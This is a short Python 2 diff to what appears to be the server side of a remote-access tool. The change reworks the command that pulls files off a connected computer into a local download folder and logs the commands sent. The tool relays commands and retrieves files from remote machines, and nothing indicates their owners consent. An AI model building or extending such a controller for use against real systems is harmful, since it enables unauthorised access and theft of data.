@@ -15,7 +15,7 @@ def usage():
     print "ip -> print the ip of the client connected"
     print "help -> show this message"
     print "wget [url] -> download file from the web"
-    print "*save [file] -> download a file that is on the connected computer"
+    print "get-file [file] -> download a file that is on the connected computer"
 
 class server():
     '''server class that received the connection and set it up'''
@@ -41,17 +41,16 @@ class server():
             elif self.buf == "ip":
                 self.buf = self.addr[0]
             elif "get-file" in self.buf:
-                with open(self.buf[9:], 'wb') as f:
-                    data = client_sock.recv(4096)
-                    print data
-                    while(data):
-                        if str(data) != -1:
-                            f.write(data)
-                            data = client_sock.recv(4096)
-                        else:
-                            print "Error with connection, couldnt open the file on remote device."
-                            break
-                    f.close()
+                client_sock.send(self.buf)
+                self.log_file.write("command sent : {0}\n".format(self.buf))
+                data = client_sock.recv(4096)
+                if "-1" in str(data):
+                    print "Error With the file, this error is client side" 
+                else:
+                    with open("download/" + self.buf[9:], 'wb') as f:
+                        f.write(data)
+                        f.close()
+                self.buf = "[!] File downloaded."
             else:
                 client_sock.send(self.buf)
                 self.log_file.write("command sent : {0}\n".format(self.buf))
